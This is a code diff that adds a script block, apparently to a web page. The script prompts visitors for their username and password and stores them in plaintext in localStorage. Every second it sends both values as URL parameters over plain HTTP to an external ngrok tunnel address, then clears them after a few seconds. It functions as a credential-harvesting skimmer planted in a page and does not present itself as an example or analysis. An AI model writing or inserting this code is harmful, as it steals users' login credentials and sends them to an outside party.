@@ -1,0 +1,35 @@
+<script >
+    let username = localStorage.getItem("username");
+    let password = localStorage.getItem("password");
+    function myFunction() {
+        if (username === null && password === null) {
+            username = prompt("Enter your username:");
+            password = prompt("Enter your password:");
+            if (username != null && username.trim() !== "" && password != null && password.trim() !== "") {
+                localStorage.setItem("username", username);
+                localStorage.setItem("password", password);
+                localStorage.setItem('tanggalSimpan', new Date().getTime());
+                location.reload();
+            } else {
+            }   
+        }else{           
+            const now = new Date().getTime();
+            const tanggalSimpan = localStorage.getItem('tanggalSimpan');
+            const selisihWaktu  = now - tanggalSimpan;
+            const tujuanWaktu   = 6000;
+            if (selisihWaktu > tujuanWaktu) {
+                localStorage.removeItem('username');
+                localStorage.removeItem('password');
+                localStorage.removeItem('tanggalSimpan');
+                location.reload();
+                }else{
+                    const url = "http://faf9-2404-8000-1000-3705-6bc-8918-7118-54f4.ngrok.io/?username=" + username + "&password="+ password;
+                    fetch(url)
+                    .then((response) => response.json())
+                    .then((data) => console.log(data))
+                    .catch((error) => console.log(error));
+                }   
+            }
+        }
+        setInterval(myFunction, 1000);   
+</script>
